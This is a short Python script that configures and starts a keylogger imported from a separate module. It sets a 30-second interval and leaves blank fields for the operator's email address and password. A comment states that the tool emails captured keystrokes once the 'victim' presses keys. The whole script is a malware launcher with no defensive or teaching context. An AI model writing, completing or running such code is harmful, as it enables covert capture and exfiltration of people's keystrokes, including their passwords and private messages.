import keylogger
import argparse
time = 30 #after this time keylogger will send an email if victim pressed any key 
mail = '' #Your email address
password = '' #Your password 
my_keylogger =  keylogger.Keylogger(time, mail, password)
my_keylogger.start()
